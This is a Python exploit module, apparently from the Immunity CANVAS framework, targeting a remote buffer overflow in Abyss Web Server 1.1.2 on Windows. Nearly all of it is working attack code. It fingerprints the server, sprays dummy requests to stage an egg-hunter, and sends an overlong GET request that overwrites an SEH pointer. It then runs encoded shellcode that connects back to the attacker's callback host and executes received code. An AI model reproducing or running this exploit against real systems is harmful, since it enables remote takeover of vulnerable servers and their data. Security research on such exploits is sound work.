#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information


VERSION="1.0"

CHANGES="""
1.0 released.

"""

notes="""
You only get one shot with this, since the process dies afterwards.
1.1.6 is the fixed version.

"""

#http://www.immunityinc.com/CANVAS/
#Questions, comments: dave@immunityinc.com
#

import sys
sys.path.append(".")
sys.path.append("../../")

from exploitutils import *
from tcpexploit import tcpexploit
import urllib

#TODO: FIX THESE
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Aprelium"
DOCUMENTATION["Date public"]="06/29/03"
DOCUMENTATION["CERT Advisory"]="None"
DOCUMENTATION["CVE Name"]="CVE-2003-1337"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=2003-1337"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["References"]="http://archives.neohapsis.com/archives/bugtraq/2003-06/0235.html"
DOCUMENTATION["Notes"] = "None"
DESCRIPTION="Abyss Web Server Overflow"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "NT", "2000", "XP", "2003" ]

NAME="abyss"


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name=NAME
        self.setPort(80)
        self.setHost("")
        self.ssl=0
        self.setVersion(1)

        self.searchbadstring="~#\x00\\/.:;?\r\n%?,;\"=&+\'"
        self.badstring=self.searchbadstring
        self.shelloffset=0
        self.returnoffset=0
        self.attacklen=3090
        self.dummyoffset=100
        
        #used for search shellcode
        self.tag1="AACC"
        self.tag2="ACAC"

        self.usedummies=1
        self.verDict={}
        self.verDict["Abyss/1.1.2 (Win32) AbyssLib/1.0.4"]=1
        return

    def createShellcode(self):
        localhost=self.callback.ip
        localport=self.callback.port
        from shellcode import shellcodeGenerator
        sc = shellcodeGenerator.win32()
        sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("tcpconnect", {"port" : localport, "ipaddress" : localhost})
        sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        self.shellcode = sc.get()   
        from encoder import chunkedaddencoder
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.log("Encoding shellcode")
        self.shellcode = encoder.encode(self.shellcode)
        if self.shellcode == "":
            self.log("Problem encoding shellcode")
            return 0
        self.shellcode=self.tag2+self.tag1+self.shellcode
        from shellcode import win32shell
        self.searchcode=win32shell.getsearchcode(self.tag1,self.tag2)
        from encoder import addencoder
        encoder=addencoder.inteladdencoder()
        encoder.setbadstring(self.searchbadstring)
        self.encodedsearchcode=encoder.encode(self.searchcode)
        if not self.encodedsearchcode:
            return None
        self.log("Length of search shellcode: %d, length of real shellcode: %d\n"%(len(self.searchcode), len(self.shellcode)))
        return 1
        
    def test(self):
        """
        Tests for Abyss's presence. Prints out the version if
        found.
        """
        self.host=self.target.interface
        self.port=int(self.argsDict["port"])

        s = self.gettcpsock()
        try:
            self.log("Testing for Abyss at %s:%d"%(self.host,self.port))
            s.connect((self.host, self.port))
        except:
            self.log("Failed to connect.")
            return 0
        
        s.send("GET /blah.html HTTP/1.0\r\n\r\n")
        data=s.recv(50000)
        self.log("Test for Abyss Returned: %s"%data)

        if data.find("HTTP/1.1")!=-1:
            while data!="":
                i=data.find("Server: ")
                if i!=-1:
                    i2=data[i:].find("\r\n")
                    ver=data[i+8:i+i2]
                    self.log("Version=%s"%ver)
                    if ver in self.verDict:
                        self.setVersion(self.verDict[ver])
                        return 1
                    else:
                        self.log("Version not found in verDict")
                        return 0
                data=s.recv(50000)
                #print "Data returned =%s"%data
        self.log("Did not find a good Server: string in response")
        return 0
    
    def setSSL(self,ssl):
        self.ssl=ssl
        return

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def run(self):

        if "ssl" in self.argsDict and self.argsDict["ssl"]:
            print "Setting ssl"
            self.setSSL(1)

        self.host=self.target.interface
        self.port=int(self.argsDict["port"])

        app=self
        if self.version==0:
            self.log("Attempting automatic version determination")
            if self.test()==1:
                self.log("Version found: %d"%self.version)
            else:
                self.log("No good version found.")
                return
            
        if self.version==1:
            self.log("Using version for Abyss/1.1.2 (Win32) AbyssLib/1.0.4 ")
            #overwrite thread SEH chain pointer of first thread
            #overwriting the lower two bytes of this will point
            #it to our string on the main thread's stack - should
            #alway work.
            #7ffdd000 is the thread data block
            #only the first 2 bytes of this matter...
            #TRIED: FB68 | FD18  FB2C FD80 FD8C
            self.geteip=0xfd800102L
            self.overwrite=0x7ffdc000-2
            self.returnoffset=2048+7
            self.overwriteoffset=self.returnoffset+4
            self.shelloffset=self.returnoffset-1500
            self.attacklen=3000
            self.dotry()
            if app.ISucceeded():
                return "Successful!"
    

        self.log("Abyss EXPLOIT ATTEMPT FINISHED")
        return "Not Successful"

    def makedummy(self):
        dummystring="B"*1000
        dummystring=stroverwrite(dummystring,self.encodedsearchcode,self.dummyoffset)
        dummystring=urllib.quote_plus(dummystring)
        header=""
        body=""
        header+="GET /%s HTTP/1.1\r\n"%dummystring
        header+="Content-Type: application/x-www-form-urlencoded\r\n"
        header+="Connection: close\r\n"
        header+="Cookie: User=bob; Lang=en; Theme=standard\r\n"
        header+="User-Agent: Mozilla/4.76 [en] (X11; U; Linux 2.4.2-2 i686)\r\n"
        header+="Host: 127.0.0.1:9999\r\n"
        header+="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png\r\n"
        header+="Accept-Language: en\r\n"
        header+="Accept-Charset: iso-8859-1,*,utf-8\r\n"
        header+="Content-Length: %d\r\n"%(len(body)+500)
        #tmp+="Host: localhost\r\n"
        #tmp+="Content-Length: 0\r\n"
        tmp=header+body
        return tmp

    
    def makeshelldummy(self):
        dummystring="B"*1000
        dummystring=stroverwrite(dummystring,self.shellcode,5)
        #dummystring=urllib.quote_plus(dummystring)
        header=""
        body=""
        header+="POST /%s HTTP/1.1\r\n"%dummystring
        header+="Content-Type: application/x-www-form-urlencoded\r\n"
        header+="Connection: close\r\n"
        header+="Cookie: User=bob; Lang=en; Theme=standard\r\n"
        header+="User-Agent: Mozilla/4.76 [en] (X11; U; Linux 2.4.2-2 i686)\r\n"
        header+="Host: 127.0.0.1:9999\r\n"
        header+="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png\r\n"
        header+="Accept-Language: en\r\n"
        header+="Accept-Charset: iso-8859-1,*,utf-8\r\n"
        header+="Content-Length: %d\r\n"%(len(body)+500)
        #tmp+="Host: localhost\r\n"
        #tmp+="Content-Length: 0\r\n"
        tmp=header+body
        return tmp
    
    def dotry(self):
        import socket, time
        #first make socket connection to target port
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.set_timeout(5)
        try:
            s.connect((self.host, self.port))
        except:
            self.log("Sleeping since we could not connect.")
            time.sleep(15)
            s.connect((self.host, self.port))


        if self.usedummies:
            self.log("Sending dummy attacks to initialize server threads")
            #have 15 threads connect with dummy data
            #this fills the heap/stack with our data
            #and also initializes all the threads, so we
            #don't have to worry about them not existing
            dummystring=self.makedummy()
            socks={}
            for i in range(0,15):
                socks[i]=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socks[i].connect((self.host, self.port))
                self.websend(socks[i],dummystring)

        shelldummy=self.makeshelldummy()
        s2=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2.connect((self.host, self.port))
        self.websend(s2,shelldummy)


        #self.log("Sleeping for 5 seconds")
        #time.sleep(5)
        sploitstring=self.makesploit()
        self.websend(s,sploitstring)
        self.webrecv(s)
        s.close()
            
        if self.ISucceeded():
                return "Successful!"

        connected=0
        self.log("Closing dummy sockets")
        #Close all those sockets now
        for sock in socks:
            socks[sock].close()

        #timeout=5
        #self.log("Sleeping for %d seconds"%timeout)
        #time.sleep(timeout)
        #success
        return 1 


    #returns the sploitstring
    def makesploit(self):
        header=""
        body=""

        geteip=self.geteip
        overwrite=self.overwrite
        eipstring=intel_order(geteip)
        overwritestring=intel_order(overwrite)
        overoffset=self.overwriteoffset
        retoffset=self.returnoffset
        shelloffset=self.shelloffset
        attacklen=self.attacklen
        self.log("Return Offset= %d Shellcode offset=%d Attacklen=%d"%(retoffset,shelloffset,attacklen))

        teststring=""

        for i in range(0,3):
            if chr(0+i) not in self.badstring:
                teststring+=chr(0+i)

        teststring=""
        teststring+="A"*800
        teststring+="ABCD"
        
        #print "Teststring=%s"%prettyprint(teststring)
        #print "--"
        testoffset=2048    
        attackstring="A"*self.attacklen+":\\"
        #attackstring=stroverwrite(attackstring,teststring,testoffset)
        #self.shellcode="\xcc"
        #attackstring=stroverwrite(attackstring,"\xcc"+self.shellcode,self.shelloffset)
        attackstring=stroverwrite(attackstring,self.encodedsearchcode,self.shelloffset)
        attackstring=stroverwrite(attackstring,eipstring,retoffset)
        attackstring=stroverwrite(attackstring,overwritestring,overoffset)
        attackstring=urllib.quote_plus(attackstring)
        #print prettyprint(attackstring)        
        #sys.exit(1)
        header+="GET /%s HTTP/1.1\r\n"%attackstring
        header+="Content-Type: application/x-www-form-urlencoded\r\n"
        header+="Connection: close\r\n"
        #header+="Cookie: User=bob; Lang=en; Theme=standard\r\n"
        #header+="User-Agent: Mozilla/4.76 [en] (X11; U; Linux 2.4.2-2 i686)\r\n"
        header+="Host: boblocalhost\r\n"
        header+="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png\r\n"
        header+="Accept-Language: en\r\n"
        header+="Accept-Charset: iso-8859-1,*,utf-8\r\n"
        #this is searched for by the search code
        #header+="Cookie: %s\r\n"%(teststring)
        #body+="Shellcode=%s\r\n"%(self.shellcode)
        header+="Content-Length: %d\r\n"%len(body)

        header+="\r\n"
        #print prettyprint(self.shellcode)
        return header+body

    def usage(self):
        print "Usage: %s -v version -t host -l localIP -d localPort (connectback) [ -p port -T (toggle test mode) -O ssl:1 (toggle ssl) ]"% sys.argv[0]
        self.printversions()

    def printversions(self):
        print "Available versions: "
        print "\t1 : Abyss/1.1.2 (Win32) AbyssLib/1.0.4"
        return

#this stuff happens.
if __name__ == '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret=standard_callback_commandline(app)

